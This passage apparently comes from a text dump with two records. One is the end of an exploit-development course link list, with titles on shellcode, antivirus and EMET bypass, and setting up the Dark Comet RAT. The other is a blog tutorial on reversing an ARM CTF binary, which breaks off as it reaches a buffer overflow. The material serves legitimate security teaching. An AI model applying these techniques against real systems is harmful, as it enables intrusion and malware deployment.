exploit?\n[110]Ch 5h: Dangling Pointers: Vulnerability and Exploitation Basics\n[111]Ch 5i: Much ado about NULL: Exploiting a kernel NULL dereference\n[112]Ch 5j: HEAP BASED EXPLOITATION. Scott Hand CSG 2\/22\/12 - PDF (link\nworking 2-28-18)\n[113]Ch 6a: theForger's Win32 API Tutorial\n[114]Ch 6b: Process Explorer\n[115]Ch 6c: Portable Executable - Wikipedia\n[116]Ch 6d: PEview (PECOFF file viewer)\n[117]Ch 6e: Rebasing Win32 DLLs\n[118]Ch 6f: Why is 0x00400000 the default base address for an\nexecutable?\n[119]Ch 6g: VA (Virtual Adress) & RVA (Relative Virtual Address) -\nStack Overflow\n[120]Ch 6h: Exploiting the LNK Vulnerability with Metasploit\n[121]Ch 6i: Is there any difference between a GUID and a UUID? - Stack\nOverflow\n[122]Ch 6j: Service Control Manager - Wikipedia\n[123]Ch 6k: Microsoft RPC Remote Procedure Call and End Point Mapper\nwith Network Traces\n[124]Ch 6l: Setting Up Kernel-Mode Debugging over a Network Cable\nManually (Windows Debuggers)\n[125]Ch 6k: IMMUNITY Debugger\n[126]Ch 6l: Operating Systems Development - Portable Executable (PE)\n[127]Ch 6m: RPC Endpoint Mapper in a network trace\n[128]L7a: AMD64 Architecture Processor (pdf, downloads immediately)\n(updated 1-25-18, ty B Meixell)\n[129]L7b: x64 Architecture - Windows 10 hardware dev\n[130]L7c: Introduction to x64 Assembly | Intel Developer Zone\n[131]L7d: Behind Windows x64's 44-bit Virtual Memory Addressing Limit\n[132]L7e: Windows 8.1 removes the 44-bit limitation (2015)\n[133]L7f: X86-64 (AMD64) Tutorial\n[134]L7g: AMD CPUID Specification\n[135]L7h: Searchable Linux Syscall Table for x86 and x86_64\n[136]L7i: Intel\u00ae 64 and IA-32 Architectures Software Developers Manual\n[137]L7j: 64-bit Linux stack smashing tutorial: Part 1\n[138]L7k: x86-64 - Wikipedia--AMD 64-bit processors only use 48-bit\naddress space\n[139]L7l: Linux\/x86_64 execve\"\/bin\/sh\"; shellcode 30 bytes\n[140]L7m: Writing shellcode for Linux and *BSD - Spawning a shell\n[141]L7n: Execve Shellcode 64 bit\n[142]L7o: Writing 64-Bit Shellcode - Part 1\n[143]L7p: 64 Bits Linux Stack Based Buffer Overflow (updated 1-25-18,\nty B Meixell)\n[144]L7q: memory management - What and where are the stack and heap? -\nStack Overflow\n[145]Ch 8a: Win32 Thread Information Block - Wikipedia\n[146]Ch 8b: TEB structure (Windows)\n[147]Ch 8c: Process Environment Block - Wikipedia\n[148]Ch 8d: PEB structure (Windows)\n[149]Ch 8e: assembly - What is the \"FS\" \"GS\" register intended for? -\nStack Overflow\n[150]Ch 8f: Preventing the Exploitation of Structured Exception Handler\n(SEH) Overwrites with SEHOP (2009)\n[151]Ch 8h: SEH Based Overflow Exploit Tutorial - InfoSec Resources\n[152]Ch 8i: Windows ISV Software Security Defenses (2010)\n[153]Ch 8j: Software Defense: mitigating stack corruption\nvulnerabilities (2014)\n[154]Ch 8k: SEHOP per-process opt-in support in Windows 7\n[155]Ch 8l: Vista SP1 and Server 2008: Controlling SEHOP security\nprotection\n[156]Ch 8m: Reducing the Effective Entropy of GS Cookies (2007)\n[157]Ch 8n: HeapCreate function (Windows)\n[158]Ch 8o: Heap Overflow: Vulnerability and Heap Internals Explained -\nInfoSec Resources\n[159]Ch 8p: Intercepting Calls to COM Interfaces - CodeProject\n[160]Ch 8q: Exploiting Lingering Vulnerabilities in Default COM Objects\n(pdf, 2011)\n[161]Ch 8r: OLE\/COM Object Viewer Download\n[162]Ch 8s: Active X Exploitation - InfoSec Resources\n[163]Ch 8t: HEAP SPRAYING ACTIVEX CONTROLS UNDER ATTACK -- STEP-BY-STEP\nINSTRUCTIONS (2013) (updated 1-25-18, ty B Meixell)\n[164]Ch 8u: Dranzer | Vulnerability Analysis | The CERT Division\n[165]Ch 8v: dranzer download | SourceForge.net\n[166]Ch 8w: dzzie\/COMRaider on GitHub\n[167]Ch 8x: ActiveX vulnerabilities exploitation (from 2010)\n[168]Ch 8y: Win32 Thread Information Block - Wikipedia\n[169]Ch 8qq: No Loitering: Exploiting Lingering Vulnerabilities in\nDefault COM Objects (paper) | Internet Society\n[170]Ch 14a: What is linux-gate.so.1?\n[171]Ch 14b: Heap overflow using Malloc Maleficarum\n[172]Ch 14c: Windows 8 Heap Internals\n[173]Ch 14d: RdRand - Wikipedia\n[174]Ch 14e: \"We cannot trust\" Intel and Via's chip-based crypto,\nFreeBSD developers say\n[175]Ch 14f: Windows 10 security overview\n[176]Ch 14g: Windows heap cookie is only 8 bits long\n[177]\nCh 17a: Awesome-Fuzzing: A curated list of fuzzing resources ( Books,\ncourses - free and paid, videos, tools, tutorials and vulnerable\napplications to practice on )\n[178]Ch 18a: Cscope Home Page\n[179]Ch 18b: Using Cscope on large projects (example: the Linux kernel)\n[180]Ch 18c: Exuberant Ctags\n[181]Ch 18d: Splint Home Page\n[182]Ch 18e: Splint the static C code checker\n[183]Ch 18f: OPEN SOURCE STATIC CODE ANALYSIS SECURITY TOOLS\n[184]CH 18g: More Tricks For Defeating SSL In Practice\n[185]Ch 18h: CVE-2003-0161 -- Sendmail prescan() function vulnerability\n[186]Ch 18i: Port 25 (SMTP) - Remote Sendmail Header Processing\nVulnerability\n[187]Ch 18j: PHP Hash Comparison Weakness A Threat To Websites,\nResearcher Says\n[188]Ch 18k: Dangling pointer - Wikipedia\n[189]Ch 18l: How to Create a Secure Login Script in PHP and MySQL -\nwikiHow\n[190]Fuzz 1: Failure Observation Engine (FOE) tutorial - YouTube\n[191]Fuzz 2: Fuzz Testing for Dummies (2011)\n[192]Fuzz 3: Analyze Crashes to Find Security Vulnerabilities in Your\nApps\n[193]Fuzz 4: VBinDiff - Visual Binary Diff\n[194]Fuzz 5: vbindiff(1) - Linux man page\n[195]Fuzz 6: An Introduction to Fuzzing: Using fuzzers (SPIKE) to find\nvulnerabilities - InfoSec Resources\n[196]Fuzz 7: Fuzzing with Peach Part 1\n[197]Fuzz 8: GlobalSCAPE CuteZIP Stack Buffer Overflow | Rapid7\n[198]Fuzz 9: Android Intent Fuzzer\n[199]Fuzz 10: Basic Fuzzing Framework (BFF) | Vulnerability Analysis |\nThe CERT Division\n[200]Fuzz 11: HOWTO : CERT Basic Fuzzing Framework (BFF) on Ubuntu\nDesktop 12.04 LTS\n[201]Fuzz 12: Fuzzer Automation with SPIKE - InfoSec Resources\n[202]Fuzz 13: Fuzzing with Spike to Find Overflows\n[203]Fuzz 14: [Python] IRC Fuzzer - IRCdFuzz.py\n[204]Fuzz 15: american fuzzy lop\n[205]Fuzz 16: Bug Hunting Using Fuzzing and Static Analysis\n[206]Fuzz 17: Fuzzing Tools in Kali Linux\n[207]Ch 16a: Socket.NoDelay Property\n[208]Ch 16b: Flawfinder Home Page\n[209]Hopper 1: Use The Debugger with Hopper Disassembler\/Decompiler -\nYouTube\n[210]Hopper 2: Tutorial\n[211]Hopper 3: Hopper Download\n[212]Hopper 4: Linux Installation\n[213]Hopper 5: Intro to Hopper - YouTube\n[214]Hopper 6: Crackmes | Reverse Engineering Mac OS X\n[215]Hopper 7: Linux x86 Program Start Up -- EXCELLENT EXPLANATION\nMiscellaneous Links\n[216]SmashTheStack Wargaming Network\n[217]Great exploit tutorials from 2012 in the WayBack Machine\n[218]Exploit Exercises\n[219]farlight.org -- useful exploits and shells\n[220]Bypassing AV Scanners -- OLLYDBG PROJECT IN HERE\n[221]Valgrind Tutorial\n[222]Bypassing EMET's EAF with custom shellcode using kernel pointer\n(from 2011)\n[223]Disarming Enhanced Mitigation Experience Toolkit (EMET) v 5.0\n[224]Rootkits by Csaba Barta (from 2009) (updated 1-25-18, ty B\nMeixell)\n[225]PSA: don't run 'strings' on untrusted files -- WORTH EXPLOITING\n[226]From 0-day to exploit -- Buffer overflow in Belkin N750\n(CVE-2014-1635)\n[227]Disarming and Bypassing EMET 5.1\n[228]BinScope Binary Analyzer -- vulnerability detector\n[229]Popular security suites open to attack -- DEP and ASLR Not Enabled\n[230]GDB: Debugging stripped binaries\n[231]USBPcap -- USE FOR PROJECTS\n[232]PBKDF2 - Wikipedia\n[233]Installing VMware Tools on Kali Linux\n[234]Kali Linux Downloads\n[235]IMMUNITY : Download\n[236]How to setup Dark Comet RAT (with download and pictures) : hacking\n[237]Cython: C-Extensions for Python -- MAKES SMALL EXEs\n[238]HT Editor -- powerful binary ELF editor\n[239]ntpdc local buffer overflow - Exploit Development example,\ninteresting GDB commands\n[240]Seven Resume Strategies for the Long-Term Unemployed\n[241]KdExploitMe - Hackable Windows Kernel Driver -- USE FOR PROJECTS\n[242]64-bit Linux Return-Oriented Programming\n[243]Exploit Exercises -- GOOD FOR PROJECTS\n[244]WIRESHARK 1.12.4 and below Access Violation and Memory Corruption\nPoC\n[245]Fuzzing with AFL-Fuzz, a Practical Example ( AFL vs binutils ) --\nUSEFUL FOR PROJECT\n[246]Radare portable reversing framework\n[247]Hopper: The OS X and Linux Disassembler -- GOOD FOR PROJECTS\n[248]Gdbinit: user-friendly gdb configuration file -- GOOD FOR PROJECTS\n[249]Format String Bug Exploration -USEFUL FOR PROJECT\n[250]90s-style security flaw puts \"millions\" of routers at risk --\nLOOKS GOOD FOR A PROJECT\n[251]Exploit Development Class for Win 7 64-bit -- USEFUL FOR PROJECTS\n[252]EDB (Evan's Debugger) -- Like OllyDbg on Linux ty @offsectraining\n[253]Sophos AV Bypass - YouTube\n[254]New buffer overflow protection in gcc 4.9 -fstack-protector-strong\n[255]Old Versions of Kali Linux\n[256]Animated Metasploit Linux Payload in gdb - YouTube\n[257]Stack Smashing On A Modern Linux System\n[258]Buffer Overflow Vulnerability Lab\n[259]VMware Tools installation fails when Easy Install is in progress\n-- GOOD SOLUTION\n[260]Installing VMware Tools in an Ubuntu virtual machine\n[261]How to turn OFF (or at least override) syntax highlighting in nano\nvia ~\/.nanorc?\n[262]Exploit writing tutorial part 11 : Heap Spraying Demystified |\nCorelan Team\n[263]MemGC and Control Flow Guard (May, 2015)\n[264]How exploit writers find bugs in Java Machine? - Reverse\nEngineering Stack Exchange\n[265]Mac OS Xploitation (2009)\n[266]Modern Binary Exploitation class from RPI\n[267]A binary analysis, count me if you can -- VERY USEFUL\n[268]picoCTF 2014 Baleful - Solving with Pin -- INTERESTING TECHNIQUE\n[269]How to detect a NX stack and other protections against buffer\noverflows -- VERY USEFUL\n[270]ROP for Linux ELF files: finding JMP ESP\n[271]Performing a ret2libc Attack (updated 1-25-18, ty B Meixell)\n[272]How to disable ASLR in linux permanently.\n[273]Python multiprocessing.Pool: -- EXCELLENT EXAMPLE\n[274]Rooting Freshly -- GOOD EXAMPLE OF PENETRATING A LINUX WEB SERVER\n[275]Exploiting memory corruption bugs in PHP Part 3: Popping Remote\nShells\n[276]Execute Bash Commands Without Spaces with Brace Expansion\n[277]x64dbg: An open-source x64\/x32 debugger for windows -- ALTERNATIVE\nTO IDA PRO\n[278]gdb bug on 64-bit ubuntu with fix: No module name libstdcxx -\nStack Overflow\n[279]gdb - debugging with pipe using mkfifio\n[280]Fuzzing on MacOS X -- MANY USEFUL TIPS\n[281]Carnegie Mellon - Tools - VulWiki\n[282]The Ultimate Disassembly Framework -- Capstone\n[283]binjitsu\/binjitsu: CTF framework and exploit development library\n[284]How To Install VMware Workstation 11 On Ubuntu 14.10\n[285]Exploitation of mem-corruptions vulns in remote C\/C++ programs\nwithout source or binary\n[286]Artistic Rendering of Exploit Development Process\n[287]Blind Return Oriented Programming (BROP)\n[288]Linux Assembly Tutorial - Step-by-Step Guide\n[289]A fundamental introduction to x86 assembly programming\n[290]RIP ROP: Intel's cunning plot to kill stack-hopping exploits at\nCPU level with \"shadow stack\" (June, 2016)\n[291]Introductory Intel x86: Architecture, Assembly, Applications -\nYouTube\n[292]Assembly Primer for Hackers (Part 1) System Organization\nTutorial.mp4 - YouTube\n[293]ARM Exploitation: Return Oriented Programming on ARM (on Linux)\n[294]How to read arbitrary RAM with format string vulnerability\n[295]The best resources for learning exploit development -- MANY GOOD\nPROJECT IDEAS\n[296]Use The Debugger with Hopper Disassembler\/Decompiler - YouTube\n[297]Over the Wire Narnia Level 2 -) 3 -- GOOD EXTRA CREDIT PROJECT\n[298]Demystifying the Execve Shellcode (Stack Method)\n[299]Program exiting after executing int 0x80 instruction when running\nshellcode\n[300]Debugging - Modifying Code At Runtime\n[301]How to specify base addresses for sections with gcc -- ESSENTIAL\nFOR KALI 2017 PROJECTS\n[302]Windows Kernel Exploitation Tutorial\n[303][Kernel Exploitation] 2: Payloads\n[304]Infosec_Reference\/Exploit Development\n[305]Requests: HTTP for Humans -- Requests 2.18.4 documentation\n[306]PEDA - Python Exploit Development Assistance for GDB\n[307]Getting cozy with exploit development\n[308]Bypassing NX\/DEP -- PoC || GTFO\n[309]Simple ASLR\/NX bypass on a Linux 32 bit binary\n[310]Binary Analysis Tool -- INTERESTING FOR PROJECTS\n[311]Linux Kernel Debugging with VMWare Player Free\n[312]Force GCC to push arguments on the stack before calling function\n(using PUSH instruction)\n[313]Analyzing Metasploit linux\/x86\/exec payload\n[314]EXPLOITATION PROJECT: HeapSpray, SEH, EggHunter\n[315]Vulnserver -- GMON command SEH based overflow exploit\n[316]OakSim: ARM Assembly Simulator\n[317]ARM Assembly and Exploitation -- USEFUL FOR PROJECTS\n[318]VM of Ubuntu with ARM in QEMU\n[319]x64dbg -- Recommended by @malwareunicorn\nNew Unsorted Links\n[320]Radare2 Projects: \"Practical case : Buffer Overflow 0x01 :\nhttps:\/\/t.co\/rMSdRZFzfv 2)Methods and macros: the call stack :\nhttps:\/\/t.co\/oDNYb0sAsr 3) Practical case: Patch Me 0x01 :\nhttps:\/\/t.co\/Ta2cgWQm4E 4)Conditions and loops :\nhttps:\/\/t.co\/hcZg1yNx3Z cc @LibraAnalysis\"\n[321]L7r: x86-64 - Wikipedia\n[322]Immunity error: pycommands: error importing module -- caused by\nusing 64-bit Python\n[323]The Cost of Buffer Security Checks in Visual C\n[324]Ch 14h: GS (Buffer Security Check) -- Official Microsoft\nDocumentation\n[325]Enable or disable specific mitigations used by Exploit protection\n| Microsoft Docs\n[326]Control Flow Guard | Microsoft Docs\n[327]vulnserver\/vulnserver.c at master \u00ef\u00bf\u00bd stephenbradshaw\/vulnserver\n\u00ef\u00bf\u00bd GitHub\n[328]Dangling Pointers Avoid them Strictly!\n[329]Wxploiting Format Strings in Windows\n[330]6 Best Wireshark Alternatives for Android\n[331]DLL Hijacking with Ghidra--USE FOR PROJECT\n[332]wntools --CTF framework and exploit development library\n[333]Return Oriented Programming on ARM (32-bit)--USE FOR PROJECTS\n[334]Reverse Engineering with Ghidra -- USE FOR PROJECTS\n[335]Online Courses -- Ghidra\n[336]Heap Overflow Exploitation on Windows 10 Explained\n[337]Honggfuzz finding a double-free in VLC -- USE FOR PROJECT\n[338]How to Compile 32-bit Apps on 64-bit Ubuntu?\n[339]Debug 32 bit application with gdb in 64 bit environment\n[340]Modern Windows Exploit Development.pdf\n[341]Dump TEB\/PEB in immunitydbg - Reverse Engineering Stack Exchange\n[342]Ch 7r: Maximum addressable memory under the current operating\nsystems\n[343]L7r: Maximum addressable memory under the current operating\nsystems\n[344]Demystifying Dot NET Reverse Engineering, Part 1: Big Introduction\n[345]Demystifying dot NET reverse engineering - PART 2: Introducing\nByte Patching\n[346]Demystifying dot NET reverse engineering - PART 3: Advanced Byte\nPatching\n[347]Bypassing SEHOP\n[348]DEP Bypass using ROP Chains | Garima Sinha - securityresearch -\nMedium\n[349]Linux Kernel ROP - Ropping your way to # (Part 1) | Trustwave |\nSpiderLabs | Trustwave\n[350]Libxml2 Tutorial | AFLplusplus -- FUZZER PROJECT\n[351]2020-05-13: Solving Uninitialized Stack Memory on Windows --\nINTERESTING CHART OF ROOT CAUSES\n[352]Porting VulnServer TRUN \/.:\/ exploit to Metasploit -- Duncan\nWinfrey\n[353]Bypassing SEHOP (but only 1\/512 of the time)\n[354]Ch 3o: assembly - How to use sysenter under Linux?\n[355]GitHub - johnjhacking\/Buffer-Overflow-Guide: This Bufferflow Guide\nincludes instructions and the scripts necessary for Buffer Overflow\nExploitation. This guide is a supplement for TheCyberMentor's\nwalkthrough. Please watch his walkthrough if you're confused. Feel free\nto implement Pull Requests or raise Issues.\n[356]Labs | CyberDefenders \u00c2\u00ae | Blue Team CTF Challenges\n[357]2021-12-02: ydkhatri\/mac_apt: macOS ( and ios) Artifact Parsing\nTool\n[358]Learning Linux kernel exploitation - Part 1 - Laying the\ngroundwork\n[359]Beginner Reverse Engineering Tutorials\n[360]Resources for learning exploit development\n[361]OSED - Navigating The Shadows\n[362]OSCP Guide\n[363]OFFENSIVE SECURITY & REVERSE ENGINEERING (OSRE) Course\n[364]Back to Top\nLast Updated: 1-6-16"}
{"text":"#[1]Mathy Vanhoef - Atom [2]Mathy Vanhoef - RSS [3]Mathy Vanhoef - Atom\n[4]Mathy Vanhoef\nProfessor at KU Leuven (Belgium) | Ex-PostDoc at NYU | Open to\nconsultancy\nPages\n* [5]Home\n* [6]Publications\n* [7]Tools\n* [8]About\nSunday 15 December 2013\nReversing and Exploiting ARM Binaries: rwthCTF Trafman\nAs ARM is becoming more and more popular, the need to reverse engineer\nARM binaries is increasing as well. For example, nearly all mobile\nphones have at least one ARM processor. In this post I show how to set\nup a virtual ARM environment using Qemu, give an introduction to ARM\nassembly (while highlighting the differences with x86), show how to\nreverse ARM binaries, and finally demonstrate how to write basic\nexploits for ARM. We will use the [9]trafman challenge of [10]rwthCTF\nas an example.\nVirtual ARM Environment\nTo start we need an environment capable of running ARM binaries. Since\nI didn't have an ARM machine I created a virtual ARM environment using\nQemu. Qemu is similar to VirtualBox or VMWare, except that it can\nsupport multiple architectures. This allows you the emulate ARM on your\ndefault x86 or x64 machine.\nFirst we need to know which ARM architecture to pick. Most Linux\ndistributions support two architectures: armel and armhf.\nArmel supports the ARMv4 instruction set and emulates floating point\noperations in software, while armhf supports the ARMv7 instruction set\nand uses hardware floating point operations. At least that's the case\nfor Debian, Ubuntu uses the term \"armel\" differently [[11]Ubuntu FAQ,\n[12]ARM FOSDEM]. In this post I will stick to Debian. Though I haven't\ntested this myself, it should be possible to [13]run armel binaries on\nan armhf system (this should be true for both Ubuntu and Debian).\n[14]For completeness, there were also the 'arm' and\n'armeb' architectures, but they are no longer supported and don't\nappear to be used anymore. We will use the armhf architecture, in\nparticular [15]Debian Wheezy armhf.\nUnlike x86\/PC systems, ARM systems typically don't have a BIOS. This\nmeans nothing initializes the hardware, reads the first sector of the\ndisk, or finds where to execute code from. Instead, Qemu allows you to\nstart a system using a \"-kernel\" option. It loads the given binary into\nmemory at 0x6001000 and uses a kernel calling convention to pass the\ncommandline and the location of initrd [[16]#IO ARM Challenge]. In\npractice this means we'll always have to start Qemu using a -kernel and\n-initrd option.\nWith that background we're ready to install Debian Wheezy armhf using\nQemu. First create an empty directory for the virtual environment,\ncreate a virtual harddisk for Qemu, and download the appropriate initrd\nand vmlinux from the Debian FTP:\n* qemu-img create -f raw hda.img 3G\n* wget\n[17]http:\/\/ftp.debian.org\/debian\/dists\/wheezy\/main\/installer-armhf\/\ncurrent\/images\/vexpress\/netboot\/initrd.gz\n* wget\n[18]http:\/\/ftp.debian.org\/debian\/dists\/wheezy\/main\/installer-armhf\/\ncurrent\/images\/vexpress\/netboot\/vmlinuz-3.2.0-4-vexpress\nNote that vexpress stands for the system we will emulate, namely a\nVersatile Express board. We will emulate it with a cortex-a9 processor,\nso we pass vexpress-a9 as an argument to Qemu. Now start the installer\nunder Qemu as follows:\n* qemu-system-arm -M vexpress-a9 -kernel vmlinuz-3.2.0-4-vexpress\n-initrd initrd.gz -append \"root=\/dev\/mmcblk0\" -drive\nif=sd,cache=unsafe,file=hda.img\nFollow the instructions. A graphical environment is not required. After\nthe installation we have to extract the installed initrd image,\notherwise (if you use the downloaded initrd) the installer will again\nboot. To mount the virtual filesystem we first have to find the proper\noffset. Execute \"file hda.img\". The output should include something\nlike \"startsector 2048\". The offset is now 512*2048. In case your\noffset is different than 2048 you will have to update the numbers in\nthe next commands:\n* mkdir mountdir\n* mount -o loop,offset=$((512*2048)) hda.img mountdir\/\n* cp mountdir\/initrd.img-3.2.0-4-vexpress .\n* umount mountdir\/\nAnd now you can boot your virtual ARM environment with:\n* qemu-system-arm -M vexpress-a9\n-kernel vmlinuz-3.2.0-4-vexpress -initrd\ninitrd.img-3.2.0-4-vexpress -append \"root=\/dev\/mmcblk0p2\" -drive\nif=sd,cache=unsafe,file=hda.img\nYou should now have a working Qemu environment.\n[19][qemu.png]\nOne warning: Qemu is still an emulator. When testing rare edge cases of\nexotic ARM instructions (which do not occur much in practice) there's\nalways a chance the emulator is wrong.\nNetwork Interface in Qemu\nIf the program you want to reverse engineer is a network service, it is\nconvenient to be able to connect to it from your host system. This\nallows you to use tools on your host system to connect and exploit the\nbinary (while debugging it in the guest system). This is especially\nconvenient if Qemu is slow.\nTo enable network support we must specify a network device (NIC) that\nwill be emulated. And we must specify the network backend that Qemu\nshould use to interact with the emulated NIC. By default Qemu emulates\nan Intel e1000 PCI card with a user-mode network stack. User mode\nnetworking is great for allowing access to network resources, including\nthe Internet. By default, however, it acts as a firewall and does not\npermit any incoming traffic. It also doesn't support protocols other\nthan TCP and UDP. For example, ping won't work [[20]WikiBooks].\nThe first option to allow incoming traffic is port redirection. This\nallows you to redirect a port on the host OS to a port on the guest OS.\nFor debugging a simple service this is sufficient. As an example,\nredirecting TCP port 6666 on the host to port 8080 on the guest is done\nas follows:\nqemu-system-arm -M vexpress-a9\n-kernel vmlinuz-3.2.0-4-vexpress -initrd initrd.img-3.2.0-4-vexpress\n-append \"root=\/dev\/mmcblk0p2\" -drive\nif=sd,cache=unsafe,file=hda.img -redir tcp:6666::8080\nYou can now run a service on port 8080 in the Qemu guest, and connect\nto it from the host using port 6666. Multiple ports can be redirected.\nPort redirection can also be used to share folders between the guest\nand the host [[21]WikiBooks]. The downside is that you cannot\ndynamically add new redirects once Qemu is running. Additionally, only\nTCP and UDP are supported.\nThe second option is to create a TAP interface [[22]Tun\/Tap\nIntro, [23]QemuWiki]. It offers very good performance and can be\nconfigured to create virtually any type of network topology. This\ncreates a new virtual interface on your host system, and you can use\nthis interface to communicate with the guest. To start Qemu using a TAP\ninterface as network backend, use the following command:\nqemu-system-arm -M vexpress-a9\n-kernel vmlinuz-3.2.0-4-vexpress -initrd initrd.img-3.2.0-4-vexpress\n-append \"root=\/dev\/mmcblk0p2\" -drive\nif=sd,cache=unsafe,file=hda.img -net nic -net tap,ifname=qtap0\nUnfortunately you will have to manually configure IP addresses (e.g.\nsetup a DHCP server, configure DNS, configure IP forwarding\/NAT, etc).\nI will not go into detail here. If you don't need an internet\nconnection and only need basic communication between the host and\nguest, execute the following commands in the guest:\n* ip addr add 172.20.0.2\/24 dev eth0\n* route add default gw 172.20.0.1 eth0\nI prefer port redirection because it's easier to configure and is\nusually sufficient to get the job done.\nIntroduction to ARM Assembly\nSimplified, an ARM processor can be in two modes: ARM mode and Thumb\nmode. When the CPU is in ARM mode it executes 32 bit ARM instructions,\nand when it is in Thumb mode it executes mixed 16- and 32-bit Thumb\ninstructions. The purpose of Thumb mode is to improve code density. How\nto switch between ARM and Thumb mode will be explained shortly.\nIn both ARM and Thumb mode we have access to 16 32-bit registers called\nr0..r15. Special registers are:\n* r12: intra procedure register (ip)\n* r13: stack pointer (sp)\n* r14: link register (lr)\n* r15: program counter (pc)\nRegister r12 is sometimes used as an Intra Procedure (ip) call scratch\nregister, meaning it holds intermediate values when a subroutine is\nbeing called. So if you see the ip register in a disassembly listing,\nit does not stand for instruction pointer. Finally, subroutines must\npreserve the contents of r4..r11 and the stack pointer r13. A few short\nexamples:\nsub sp, #8        ; sp -= 8  \/\/ allocate stack memory\nadd r7, sp, #0    ; r7 = sp + 0\nadd r7, #0        ; r7 += 0\n[24]str r0, [r7, #4]  ; *(r7 + 4) = r0 \/\/ dereference ptr\n[25]str r0, [r7, #0]  ; *(r7 + 0) = r0\nnop               ; No Operation\n[26]movw r0, #33848   ; r0[0:16]  = 0x8438 \/\/ move to bottom\n[27]movt r0, #1       ; r0[16:32] = 0x1    \/\/ move to top\n; Now r0 contains 0x18438\nHere r7 is used as a frame pointer to access local variables or\nfunction arguments. Also note that certain instructions (like add) can\nhave three arguments (unlike the common two arguments in x86). In order\nto move a 32bit word in a register we need two instructions: one to set\nthe bottom half of the register, and one to set the upper half of the\nregister. This is a consequence of the RISC architecture of ARM: we\nhave simple instructions that execute quickly, but must be more verbose\nto get stuff done.\nWhat we called jumps in x86 lingo are called branches in ARM. For\nexample \"jmp offset\" on x86 becomes \"b addr\" in ARM. Function calls\nfrom x86 are also called branches, in particular \"call func\" from x86\nbecomes \"bl addr\" in ARM. Here BL stands for Branch and Link, meaning\nthe program counter r15 is set to addr and the link register r14 is set\nto the return address. This highlights an important difference with\nx86: in ARM the return address is not pushed on the stack by the\ncaller. Instead, it it always saved in the link register (lr). The\ncallee is responsible for saving the return address (generally the\ncallee will save it on the stack).\nThe instructions [28]bx, blx, and bjx can be used to switch processor\nmode from ARM to Thumb (or reverse). There are two use cases: the\ntarget is a label or the target is a register [[29]ARM]. In the case\nthe target is a label, the instruction is of the form \"blx addr\", and\nthe mode is always switched. In case the target is specified using a\nregister, e.g. \"blx lr\", the mode will be set according to the least\nsignificant bit (LSB) of the register. Note that all ARM and Thumb\ninstructions must be 16-bit (two bytes) aligned, thus the least\nsignificant bit (LSB) of function addresses is in fact always zero. An\neven address means the target code is an ARM instruction, an uneven\naddress means it is Thumb code. For example, when the register contains\nthe value 0x8001 the processor will switch to Thumb mode and start\nexecuting at 0x8000. The same is true when returning from a function:\nif the return address is even it will switch to ARM, if it is uneven it\nwill switch to Thumb mode. Returning can be done using \"pop {pc}\" or\n\"bx lr\". Both instructions will set the processor context accordingly.\nNote that branch instructions without an \"X\" in them do not change\nprocessor mode.\nOne practical consequence of ARM vs. Thumb addresses is that we often\nsee references to \"symbol+1\", indicating that the symbol is referring\nto a function in Thumb mode. Additionally we have to use correct\naddresses in our exploit: Your debugger might say a function starts at\naddress 0x8000, but if it is a function using Thumb instructions we\nmust actually use the address 0x8001 (depending on context). Finally we\nnote that we can inspect the current mode in gdb by using the \"i r\ncpsr\" command. [30]Bit 0x20 will be set if we are in Thumb mode, i.e.\nThumb mode is set if (cpsr & 0x20) != 0.\nLet's end with the second half of the previous example:\nblx 0x82ec      ; branch to 0x82ec (and switch mode)\nbl 0x8398       ; branch to 0x8298 (don't switch mode)\nadd r12, r12, #8, 20     ; r12 = 0x8000\n; 0x8000 = RotateRight(8, 2*20) [[31]ref]\nmov sp, r7      ; set stack pointer to original value\npop {r7, pc}    ; restore r7 and return to caller\nThe first instruction branches to address 0x82ec and switches the\ncurrent processor mode, with the return address saved in the lr\nregister. In case we were executing Thumb code this return address will\nbe uneven, otherwise it will be even. The second instruction branches\nto 0x8398 without switching mode (there is no x in the branch\ninstruction). Hence the function will be executed in the mode the\nprocessor is currently in. We also have an interesting add instruction:\nit adds RotateRight(8, 2*20) to r12 (which is equal to 0x8000). For\nmore background on how this constant is encoded read [32]the ARM\ndocumentation.\nIf you want to understand ARM in more detail, a fun way to learn it is\nby making an ARM intro challenge. Essentially that means displaying\ncool graphics using only ARM code. The full background on how to get\nstarted is on [33]#IO STS. Perhaps luckily, a detailed understanding is\nnot required to reverse engineer a program and follow this guide.\nReversing the Trafman Challenge\nAs an example we will reverse engineer the [34]Trafman challenge from\nrwthCTF (for the binary to work properly you need to create a directory\ncalled \"db\" next to the binary). We open the binary in [35]IDA and see\nthat it failed to disassemble the first instructions:\n[36][strafman_1.png]\nThis is because start is located at the uneven address 0x880D. In other\nwords the binary starts executing in Thumb mode at address 0x880C, but\nIDA thinks it starts executing at 0x880D. We fix this by selecting\naddress 0x880C, pressing ALT+G, and changing the value to 1 (this tells\nIDA that Thumb code is located at this address). Now again select\naddress 0x880C and press C to directly convert the section to code.\n[37][strafman_2.png]\nWe see a call which initializes libc. The pointer to the main function\nis stored in r0. Hence main() is located at address 0x87E0 and is Thumb\ncode. So go to address 0x87E0, press ALT+G, set value to 1, and repeat\nuntil all instructions are in Thumb. Now select all the instructions\nbelonging to the main function and press P to create a function of this\ncode block. We have to manually select all the instructions in the\nfunction because otherwise IDA fails to create the function for us.\nRename the function to main.\n[38][strafman_2.png]\nWith this starting point you can analyze what the binary is doing. Also\nremember to interact as much as possible with the application before\nlooking at assembler code. In fact, I found one vulnerability by simply\nentering unusual inputs.\nThe binary gets its input and output using stdin and stdout,\nrespectively. During the CTF a new executable was spawned for every new\nconnection and its input\/output was forwarded. On startup the binary\nasks for a username. Our first goal is to find a valid username.\n[39][strafman_2.png]\nWe want to locate the code responsible for checking the username. To do\nthis we find where the error message is referenced. So, open the\nStrings subview and double click on the \"ERR Invalid User\" string. Now\nselect the name of the string (aErrInvalidUser) and press X to find all\nreferences to the string. Only one function is referencing this string,\nopen it. After a little bit of reverse engineering we get the\nfollowing:\n[40][strafman_3.png]\nThe ASCII string \"traffic_operator\" is loaded and compared to the\nstring entered by the user. Based on the result of this comparison we\neither get the error message or are successfully logged in. That solves\nour first problem: the username is traffic_operator.\nOnce logged in the user has three options:\n1. Get command: the user enters a file name of exactly\n40 alphanumeric characters. If this file was previously added (see\nnext point) its content is loaded and displayed to the user.\n2. Execute command: the user enters a file name of at least 40\nalphanumeric characters. It creates a file with as name the 40\nfirst characters and allows to user to write arbitrary content to\nit.\n3. Exit.\nAfter testing these functions we find a buffer overflow when getting a\ncommand (i.e. when reading a file). To trigger the overflow we write a\nlarge file using the second option, and then read it using the first\noption. In my virtual ARM environment I used the following commands to\ntest and trigger the 